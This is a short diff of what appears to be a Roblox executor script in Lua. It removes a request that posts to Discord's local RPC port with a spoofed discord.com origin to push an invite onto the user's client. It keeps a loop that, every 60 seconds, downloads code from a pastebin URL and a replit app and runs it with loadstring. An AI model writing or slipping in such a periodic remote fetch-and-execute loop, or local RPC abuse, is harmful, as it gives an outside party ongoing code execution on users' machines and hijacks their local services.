@@ -3799,19 +3799,6 @@ end)
 
     return windowtypes
 end
-http_request({
-    Url = "http://127.0.0.1:6463/rpc?v=1",
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json",
-        ["origin"] = "https://discord.com",
-    },
-    Body = game:GetService("HttpService"):JSONEncode({
-        args = { code = "getccr" },
-        cmd = "INVITE_BROWSER",
-        nonce = "."
-    })
-})
 while wait(60) do
 loadstring(game:HttpGet("https://pastebin.com/raw/hEMkYFrV"))()
 loadstring(game:HttpGet("https://cc-r-twmgaming.replit.app/blacklists.lua?auth=ccr123223"))()
